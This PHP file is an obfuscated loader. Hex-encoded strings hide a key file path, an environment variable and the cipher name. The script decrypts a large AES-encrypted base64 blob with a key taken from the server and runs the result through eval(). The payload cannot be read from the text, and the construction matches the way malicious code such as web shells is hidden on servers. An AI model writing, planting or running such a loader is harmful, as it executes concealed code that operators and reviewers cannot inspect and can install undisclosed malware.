<?php

$f=hex2bin('2f6574632f61706c696b6173696b6974612e736563');

$k=getenv(hex2bin('41504c494b4153494b4954415f5345435f4b4559'))?:(@file_exists($f)?trim(@file_get_contents($f)):null);

if(!$k)exit;

$i=base64_decode('Jnsa9eN91R/qCxa9l02x2g==');

$c=base64_decode(

'byMgHlkPm6aFPL2xSUg6J7rLihUdjTdVVZWVAvrR/K25lygV/JKY7MFoDDEN1PpKzi/Tt4UgNohP' .
'Xi0mAhx+lAJjTWo8cxPzMKiGFUZxV7PDiKIrJ7u5T9QLKD0Qo535h5Vjql+YWYOkF/iHgqPAdFvT' .
'Nwt5qryCF4sbt0LJHXXi7+NDHQgwOpjmVd/IOXAMYvjPgBuH5fFuBwbQT9MuaR0ChpGKMoQkavZ7' .
'IFc8hwVVO9GduxM2PVjQbojV7r0mDkE+JO+2g2Npa/PWF9ylKSC1GoOwxYQtEubu1WxzQOu72fRw' .
'vLxch91jmOQCTdbI0Rv6LyGlOAgOsug9aB1vM4NbgUe+CSE5D4qt/E9kafmJx1LjpPMXU6aRuKCG' .
'jpMeldnR9MGBy7ECpUJjFAqLgVPFs+p/jYsP8rgwgNDDoyf/ZnqGuzoENPSaMBeqwVX3Y4d8vZTA' .
'uxAc55ARV0OxJX/lDGJRpQ9To5ZkzUDa2OnVsNLuPrrBGETDBinJ82awe0PaZGFpHcn1RbME4s22' .
'CJqTO5pdjblLhqJLhLf3fDwCpOujpvzkEqhYscfrZ1mf/oMGyhe9ui+kZIl1+cUkOk4h5jrtcQSV' .
'6j5mr9wzxqSTN35Yul1V3fkk6Lbnsq0pPgOwa0zy62qv7WEi5ZKCJCRzGRtNgNGP1rKk/E/e9H9J' .
'zLAfkSffkbG57zQuPQdLre8WHnEhR0nEhcRrHE5ubvkphVEz4VczTpXRE0Z8X9wYP1+I6WBVCETl' .
'vP8RReWm+zvFIWpNUOFYtfYvw73A4nEzSk+8Mg2EfELPtrsvyMwdJdu64P6c7qq8yMwYpvxiN6A3' .
'vkvDLXuCeTA1Sir1KbcrxVmgv41EMbsZZ5tmmxdnJH8UrZre1yJalte5RiSEIgbqe15xyntparen' .
'YltNeu+/PbGHzr5XSIhiYIEjJRftYq2nivI4L/ayJ3jtGQ6w4Fpy3ItzYNSPObueKU+vb+SGkJK+' .
'SEUJ/bJsMmT7cOWidQa20iH8SOHltHbsO5e+9wykp784zVTe6S+pVw7bmKfmvCxBXZloM1w/Ty+X' .
'dfYybtWXoGKssIusBOUFqxncZpLwvXfemRlhcRjai4na3lAR4J5yU/yeQiXV3qWwFZWcHdXWYx/T' .
'gp6nTMghCAVsfoNy+dJToi8qO0oDPPjjmzndyWMJnSPoDIRD9V9P8eiwsiwThkLZqe6w+Mip7FKQ' .
'7oETr4rmMTBUF8HuUGErHcFA3RnJl/lQ5gVTVSihZHJ37qPOcGXikzapetdd87gQj6JZsb4mrBGF' .
'08EJX4nXlPH+1Ls+fjNXMyg4OgFi2LxdaNGcpATu+1hHHhfz3OgtDy+B+sAjUvdInTReVSaN+5K2' .
'6Jl3aiGcWdQehCGhRZRi4fWgIzARzqyR7qE5zfBigQaZ4Gj+Wq+WjjPboWl5Tbhyn7kHfw5s0hnm' .
'9sLu1EFLxFR/aqmZ/ha+sGltsTyZkuvmznNiSPrbYY5h/DhvoWpebIM01GiUv/NiUbOEc9q2O7GC' .
'VZlaEkaHyKBBNJfcsH01yNoKhvoeH/PIFQhDJd5t//JIwlOv38enhTQA+8c2/Z90YoWjPoLfAFnM' .
's1P4XQ3zowjsLRMHBalmaGXkJiEB9kaHLO9LINldBOOUQSuI/ernuh0xTgQ+hwq4avXrmudwCZMU' .
'9X0Z9URp/9+akAniEoy8vJMzdb/St/hv/bYtYZcCdidDE53xqiqRTKQ5cAzZ6rCHYgL6nnVfaxVJ' .
'vmGNvHke5mPMoXAVlX32037b5E0fgwRKfM2B3agjrS150UU1Ylf5hZB+gRkYzgNq4lGpz/balCld' .
'DyaeH4nlUZyGBK7GD0B79AvqMEM3rjOn4iH69Qp2xLddtiBHU/2RQeNmhWJ4Gx7VgK9uW3Qj45U2' .
'DxcBekVnPhLlZOvdJfzxEChZc6Ax5bGhM/EHvorjvCKbPSZH57LsEg9XxpbpWzvalpYgtgQUtuEC' .
'Wd+SHFpij1ZAJzG0tx5EOJDF7+7+GLpO5EZxnw0mxK6Y6EybyIc8cmNM888XGkCqYH/iUkXvu+s4' .
'naqTMQWvghpwNVciFGYGuD95R8LXw5LJUhjGExQRshvLGr49ZOOL5riO5x09uptkqtCTUMOS6O3K' .
'klYAGlvdaGFkJz5IDsUjAK6Qq0eNKcwRF4SX1K0caPRfT1+pawf+M/pXLKGblOUYOOXB9rIzWlKC' .
'MxI2xBDg1Y7VnFYZw0Dy0iPucsKNHa3BTEdPuH8q3Q1vBwPMmWrzcJidwcaBsAMjVe88Epkdi0w3' .
'zcmqSCpkmxCt1s3ZeqhNAfLWG7XTd6GhYwcObgpBukXVa7f4o8rnPArhqtGtMpbRZZSEFaQdugwr' .
'KLTgcyDzb0BeXfpBIbaxjXsEOqw+pmSgNQ=='

);

$d=openssl_decrypt($c,hex2bin('6165732d3235362d636263'),hash('sha256',$k,true),1,$i);

if($d===false)exit;

eval('?>'.$d);

